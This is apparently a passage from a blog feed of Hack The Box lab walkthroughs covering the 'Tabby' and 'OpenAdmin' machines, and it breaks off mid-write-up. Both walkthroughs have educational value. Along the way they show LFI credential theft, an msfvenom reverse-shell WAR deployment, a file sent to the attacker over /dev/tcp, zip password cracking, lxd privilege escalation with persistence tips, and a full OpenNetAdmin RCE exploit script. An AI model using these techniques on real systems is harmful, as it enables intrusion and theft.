</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Mega Hosting
</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache Tomcat
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache Tomcat
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds</span>
</span></span></code></pre></div><p>An initial <code>nmap</code> scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a company website that offers hosting services called &ldquo;Mega Hosting&rdquo;.</p>
<p><div class="img-container"><img src="imgs/19847b521b1c48b08f57e8e4986fcc06.png" alt="19847b521b1c48b08f57e8e4986fcc06"  /></div>
</p>
<p>The domain name of this site is revealed from the email address and also from the page source</p>
<p><div class="img-container"><img src="imgs/image-20210426220259010.png" alt="image-20210426220259010"  /></div>
</p>
<p>I&rsquo;ll add <code>megahosting.htb</code> to <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">10.10.10.194 megahosting.htb
</span></span></code></pre></div><p>The company statement about data breach points to this link <code>http://megahosting.htb/news.php?file=statement</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210426215350459.png" alt="image-20210426215350459"  /></div>
</p>
<p>They mentioned a tool, but I have no idea what tool it is.</p>
<p>I ran gobuster but found nothing really interesting there.</p>
<h3 id="tcp-8080---tomcat">TCP 8080 - Tomcat</h3>
<p>Visiting port 8080 shows the Tomcat default page.</p>
<p><div class="img-container"><img src="imgs/09afc545cd1943dbb578574d338d0943.png" alt="09afc545cd1943dbb578574d338d0943"  /></div>
</p>
<p>Both &ldquo;manager webapp&rdquo; and &ldquo;host-manager webapp&rdquo; are asking for credentials. I tried using Tomcat&rsquo;s default credentials, but it didn&rsquo;t work.</p>
<p><div class="img-container"><img src="imgs/0aedd7409c3444a3bb359bb837b33c93.png" alt="0aedd7409c3444a3bb359bb837b33c93"  /></div>
</p>
<p>I&rsquo;ll take note on these:</p>
<ul>
<li>/etc/tomcat9/tomcat-users.xml</li>
<li>&ldquo;tomcat9&rdquo;</li>
</ul>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="getting-tomcat-credentials-via-lfi">Getting tomcat Credentials via LFI</h4>
<p>I found out the file parameter on <code>http://megahosting.htb/news.php?file=statement</code> is vulnerable to LFI.</p>
<blockquote>
<p>The LFI can be identified by assuming the website is hosted at <code>/var/www/html/megahosting/</code>. So the payload would be ../../../../file/to/read</p>
</blockquote>
<img src="imgs/42fb887abe344db48a138d3b7707cf5d.png" alt="42fb887abe344db48a138d3b7707cf5d" style="zoom:80%;" />
<p>This can be leveraged to read  <code>tomcat-users.xml</code> under <code>/etc/tomcat9/</code> . But, the file is not there, it returns a blank page.</p>
<img src="imgs/efc8b8670fa0473085bfd66dad7670f2.png" alt="efc8b8670fa0473085bfd66dad7670f2" style="zoom:80%;" />
<p>With basic Linux knowledge and service fingerprint from the <code>nmap</code> result, I can search for the exact location of the installed Tomcat.</p>
<p>First, in Linux, every software application is most likely installed in one of the following directories:</p>
<ul>
<li><code>/usr/share/appname</code></li>
<li><code>/usr/lib/appname</code></li>
<li><code>/opt/appname</code></li>
<li><code>/var/lib/appname</code></li>
</ul>
<p>Second, according to the <code>nmap</code> result, <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=OpenSSH+8.2p1&amp;searchon=all">OpenSSH version 8.2p1</a> and <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=apache2+2.4.41&amp;searchon=all">Apache version 2.4.41</a>. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=tomcat9&amp;searchon=all">search</a>, and find the install location of <a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist">Tomcat9 on Ubuntu 20.04</a>.</p>
<p>The search came up with this path <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>. When I visit that path, I get the following results:</p>
<p><div class="img-container"><img src="imgs/531dc2a899f54b368f3fdadb83623272.png" alt="531dc2a899f54b368f3fdadb83623272"  /></div>
</p>
<p>The credentials is <code>tomcat:$3cureP4s5w0rd123!</code></p>
<h4 id="html-gui---host-manager-webapp">HTML GUI - host-manager-webapp</h4>
<p>When I tried to access the host-manager-webapp with default credentials, the page says something about the roles that concerns me.</p>
<p><div class="img-container"><img src="imgs/image-20210426232907769.png" alt="image-20210426232907769"  /></div>
</p>
<p>So, based on the <code>tomcat-users.xml</code> file, <code>tomcat</code> has two roles, <code>admin-gui</code> and <code>manager-script</code>. That means the credentials is not authorized on manager-webapp (<code>/manager</code>), but it will work on host-manager-webapp (<code>/host-manager</code>),</p>
<p><div class="img-container"><img src="imgs/102088bcbb8b46a79a0f333b027bcaa2.png" alt="102088bcbb8b46a79a0f333b027bcaa2"  /></div>
</p>
<p>Another interesting one is, if I clicked the Server Status from <code>/host-manager</code> it just redirects me to <code>http://10.10.10.194:8080/manager/status/all</code>, and it doesn&rsquo;t complain about the authorization.</p>
<p><div class="img-container"><img src="imgs/314b3cdbc1964a699afeb20044dbc792.png" alt="314b3cdbc1964a699afeb20044dbc792"  /></div>
</p>
<p>So, I think I can access some features behind <code>/manager/[here]</code>.</p>
<h4 id="deploying-malicious-war-file">Deploying Malicious WAR file</h4>
<p>The second role of user tomcat is <code>manager-script</code>. <a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">This article</a> explains that <code>manager-script</code> provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI. The full documentation of what you can do with this role can be read <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands">here</a>.</p>
<p>With <code>manager-script</code> role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious <code>.war</code> file that is embedded with JSP reverse shell.</p>
<p>First, I&rsquo;ll craft a <code>.war</code> file payload using <code>msfvenom</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.30 <span class="nv">lport</span><span class="o">=</span><span class="m">9000</span> -f war -o iamf.war
</span></span></code></pre></div><p>Then I&rsquo;ll upload the payload using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ curl -u <span class="s1">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path<span class="o">=</span>/iamf.war
</span></span></code></pre></div><ul>
<li><code>-u</code> : for credential [username:password]</li>
<li><code>-T</code> : for transfer file</li>
</ul>
<p>I&rsquo;ll setup a listener, and then trigger the payload also using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ curl http://10.10.10.194:8080/iamf.war
</span></span></code></pre></div><p>My listener now have a shell.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*TG4UfRosbeX5ncZtEoIVng.png" alt="img"  /></div>
</p>
<p>I can upgrade the shell into TTY using this trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ script /dev/null<span class="p">;</span> bash
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-ash">Shell as ash</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Manual enumeration with the <code>find</code> command discovered a backup file in zip format that is owned by user <code>ash</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tomcat@tabby:/$ find / -type f -user ash 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s1">&#39;proc&#39;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/47eaa7bb176b445fa6a091ac49e5f32f.png" alt="47eaa7bb176b445fa6a091ac49e5f32f"  /></div>
</p>
<p>I&rsquo;ll transfer the backup file to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip &gt; /dev/tcp/10.10.14.30/9001
</span></span></code></pre></div><p>And receive it on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span> &gt; 16162020_backup.zip
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.30<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.194<span class="o">]</span> <span class="m">65056</span>
</span></span></code></pre></div><h4 id="recover-backup-password">Recover Backup Password</h4>
<p>The backup file is protected by a password. I&rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I&rsquo;ll have to convert it to hash format using <code>zip2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ zip2john 16162020_backup.zip &gt; backup.hash
</span></span></code></pre></div><p>The password got cracked instantly.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ john.exe --wordlist<span class="o">=</span>rockyou.txt backup.hash
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/3538b21b4a734a6981f21967db4e87fa.png" alt="3538b21b4a734a6981f21967db4e87fa"  /></div>
</p>
<p>The password is <code>admin@it</code>.</p>
<h4 id="su---ash">SU - ash</h4>
<p>It turns out that the backup password is reused by <code>ash</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">tomcat@tabby:/$ su ash
</span></span><span class="line"><span class="cl">su ash
</span></span><span class="line"><span class="cl">Password: admin@it
</span></span></code></pre></div><p>I&rsquo;ll put my SSH public key to the authorized_keys file on <code>ash</code> home directory for better shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~/.ssh$ <span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=&#39;</span> &gt; authorized_keys
</span></span></code></pre></div><p>Now I can login with my key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa ash@10.10.10.194
</span></span><span class="line"><span class="cl">ash@tabby:~$                                                                 
</span></span><span class="line"><span class="cl">ash@tabby:~$ sudo -l
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> ash:                                                                   
</span></span><span class="line"><span class="cl">Sorry, user ash may not run sudo on tabby.
</span></span><span class="line"><span class="cl">ash@tabby:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-lxc">Abusing lxc</h4>
<p>I found out that user <code>ash</code> is a member of the <code>lxd</code> group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.</p>
<blockquote>
<p>It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting <code>/</code> (root file system) to the container and interacting with it from inside the container as a privileged user.</p>
</blockquote>
<p>I&rsquo;ll use <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">this</a> article as reference.</p>
<p>First, I’ll create an alpine image on my attacking machine, which is Kali Linux.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ git clone https://github.com/saghul/lxd-alpine-builder
</span></span><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> lxd-alpine-builder
</span></span><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ ./build-alpine
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/99679b825f584f4aaefa3412876cd211.png" alt="99679b825f584f4aaefa3412876cd211"  /></div>
</p>
<p>Once it&rsquo;s done, there will be an image file called <code>alpine-v3.12-x86_64-blablabla</code>. In my case, it is <code>alpine-v3.12-x86_64-20201107_1900.tar.gz</code>. I&rsquo;ll send the image to Tabby via <code>scp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz  ash@10.10.10.194:/tmp
</span></span></code></pre></div><p>I&rsquo;ll initialize the lxd (storage pool, profile, etc..).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~$ lxd init
</span></span></code></pre></div><p>I&rsquo;ll import the image, and then initialize a container with <code>security.privileged</code> enabled from it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
</span></span><span class="line"><span class="cl">ash@tabby:~$ lxc init iamf-img img-container -c security.privileged<span class="o">=</span><span class="nb">true</span>
</span></span></code></pre></div><p>Next, I&rsquo;ll mount the root file system of the host to the container at <code>/mnt/root</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~$ lxc config device add img-container iamf-test disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root
</span></span><span class="line"><span class="cl">Device iamf-test added to img-container
</span></span></code></pre></div><p>After that, I&rsquo;ll start the container. I can confirm it is running using <code>lxc ls</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ash@tabby:~$ lxc start img-container
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003512685.png" alt="image-20210427003512685"  /></div>
</p>
<p>Now I can just interact with the container and grab the root flag on <code>/mnt/root/root/root.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ash@tabby:~<span class="nv">$lxc</span> <span class="nb">exec</span> img-container /bin/sh
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003902623.png" alt="image-20210427003902623"  /></div>
</p>
<p>Modifications on <code>/mnt/root/</code> will also affect the root file system of the host. Other things I can do from the container is:</p>
<ul>
<li>Adding a persistent user via <code>/etc/passwd</code> (<code>/mnt/root/etc/passwd</code>)</li>
<li>Adding a SUID bash (<code>cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash</code>)</li>
<li>Enabling root login and put my SSH public key to the root <code>authorized_keys</code> file.</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - OpenAdmin</title>
      <link>https://fahmifj.github.io/hackthebox/openadmin/</link>
      <pubDate>Fri, 01 May 2020 20:33:36 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/openadmin/</guid>
      <description>Exploiting OpenNetAdmin vulnerability and sudo nano</description>
      <content:encoded><![CDATA[<p>OpenAdmin starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then leveraged to gain a foothold on the system. Enumerating inside the machine reveals a database password that is reused by one of the users. This user has access to internal web which can be exploited to obtain the SSH key of another user. The second user is allowed to run a <code>nano</code> editor with sudo privileges, and this can be abused to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploitation of OpenNetAdmin 18.1.1</li>
<li>Sudo exploitation on <code>nano</code>.</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Dirb - Preinstalled in Kali Linux</li>
<li>John The Ripper - <a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class="line"><span class="cl">$ nmap -sV -sC -oA OpenAdmin <span class="s1">&#39;10.10.10.171&#39;</span> -v
</span></span></code></pre></div><ul>
<li><code>-sC</code>, to scan with default script</li>
<li><code>-sV</code>, to scan service version</li>
<li><code>-oA</code>, to save the output to all formats</li>
<li><code>-v</code>, verbose mode</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey:
</span></span><span class="line"><span class="cl">|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
</span></span><span class="line"><span class="cl">|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>From the scan results, <code>nmap</code> found two open ports:</p>
<ul>
<li>An SSH service running on port 22</li>
<li>An HTTP service running on port 80</li>
</ul>
<p>As SSH usually requires valid credentials and there&rsquo;s is no straight exploit yet, hence further enumeration is needed.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP  80 - Website</h3>
<p>Visiting the standard http port only displays the Apache default page.</p>
<p><div class="img-container"><img src="imgs/4fb96d89a99c4244bb54291abd974267.png" alt="1ad0727e5956f0800cbe4ec0c02df451.png"  /></div>
</p>
<h4 id="directory-brute-force---dirb">Directory Brute Force - dirb</h4>
<p>Running  <code>dirb</code>  against the web successfully discovered a few hidden paths.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «openadmin» «10.10.14.7»
</span></span><span class="line"><span class="cl">$ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">---- Scanning URL: http://10.10.10.171/ ----
</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http://10.10.10.171/artwork/
</span></span><span class="line"><span class="cl">+ http://10.10.10.171/index.html<span class="o">(</span>CODE:200<span class="p">|</span>SIZE:10918<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">==</span>&gt; DIRECTORY: http:/10.10.10.171/music/
</span></span><span class="line"><span class="cl">+ http://10.10.10.171/server-status <span class="o">(</span>CODE:200<span class="p">|</span>SIZE:278<span class="o">)</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="artwork">/artwork/</h4>
<p>Nothing here.</p>
<p><div class="img-container"><img src="imgs/image-20210402000812490.png" alt="image-20210402000812490"  /></div>
</p>
<h4 id="music">/music/</h4>
<p>The <code>/music</code> home page provides a login menu that points to <code>http://openadmin.htb/ona</code></p>
<p><div class="img-container"><img src="imgs/image-20210402000847660.png" alt="image-20210402000847660"  /></div>
</p>
<h4 id="ona">/ona/</h4>
<p>Visiting <code>/ona/</code> brings me to an instance of OpenNetAdmin. It is a software for managing network related things.</p>
<p><div class="img-container"><img src="imgs/88b4ba1460574b0f88a4acd81e00d392.png" alt="f0df4d83acc69be1e666eb6e40a73494.png"  /></div>
</p>
<p>There&rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (<code>v18.1.1</code>)</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="opennetadmin-1811-rce">OpenNetAdmin 18.1.1 RCE</h4>
<p>Based on the version above, a quick search on <code>exploit-db</code> shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The <a href="https://www.exploit-db.com/exploits/47691">exploit PoC</a> source code is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">URL</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span><span class="k">do</span>
</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> -n <span class="s2">&#34;</span>$<span class="s2"> &#34;</span><span class="p">;</span> <span class="nb">read</span> cmd
</span></span><span class="line"><span class="cl"> curl --silent -d <span class="s2">&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span class="si">${</span><span class="nv">cmd</span><span class="si">}</span><span class="s2">;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">URL</span><span class="si">}</span><span class="s2">&#34;</span> <span class="p">|</span> sed -n -e <span class="s1">&#39;/BEGIN/,/END/ p&#39;</span> <span class="p">|</span> tail -n +2 <span class="p">|</span> head -n -1
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><p>I saved the exploit to a file called <code>OpenRCE.sh</code>. I ran the exploit and it resulted in a shell access as www-data</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «openadmin» «10.10.14.7» 
</span></span><span class="line"><span class="cl">$ ./OpenRCE.sh http://10.10.10.171/ona/
</span></span><span class="line"><span class="cl">$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ hostname
</span></span><span class="line"><span class="cl">openadmin
</span></span><span class="line"><span class="cl">$ ip a
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">    inet6 ::1/128 scope host 
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc mq state UP group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/ether 00:50:56:b9:72:3a brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">    inet6 dead:beef::250:56ff:feb9:723a/64 scope global dynamic mngtmpaddr 
</span></span><span class="line"><span class="cl">       valid_lft 86350sec preferred_lft 14350sec
</span></span><span class="line"><span class="cl">    inet6 fe80::250:56ff:feb9:723a/64 scope link 
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jimmy">Shell as jimmy</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Upon enumerating the current working directory, a database credential is found in <code>./local/config/database_settings.inc.php</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat ./local/config/database_settings.inc.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$ona_contexts</span><span class="o">=</span>array <span class="o">(</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;DEFAULT&#39;</span> <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="cl">  array <span class="o">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;databases&#39;</span> <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="cl">    array <span class="o">(</span>
</span></span><span class="line"><span class="cl">      <span class="nv">0</span> <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="cl">      array <span class="o">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;db_type&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;mysqli&#39;</span>,
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;db_host&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;localhost&#39;</span>,
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;db_login&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;ona_sys&#39;</span>,
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;db_passwd&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;n1nj4W4rri0R!&#39;</span>,
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;db_database&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;ona_default&#39;</span>,
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;db_debug&#39;</span> <span class="o">=</span>&gt; false,
</span></span><span class="line"><span class="cl">      <span class="o">)</span>,
</span></span><span class="line"><span class="cl">    <span class="o">)</span>,
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;description&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;Default data context&#39;</span>,
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;context_color&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;#D3DBFF&#39;</span>,
</span></span><span class="line"><span class="cl">  <span class="o">)</span>,
</span></span><span class="line"><span class="cl"><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><h4 id="ssh-access">SSH access</h4>
<p>The password worked for user <code>jimmy</code>, but the user flag can not be found in <code>jimmy</code>’s home directory.</p>
<p><div class="img-container"><img src="imgs/25ec2fca7eb84dad9f748aeb299ef35b.png" alt="a0518e175f0d68951eac7bbb348b24e0.png"  /></div>
</p>
<h3 id="shell-as-joanna">Shell as joanna</h3>
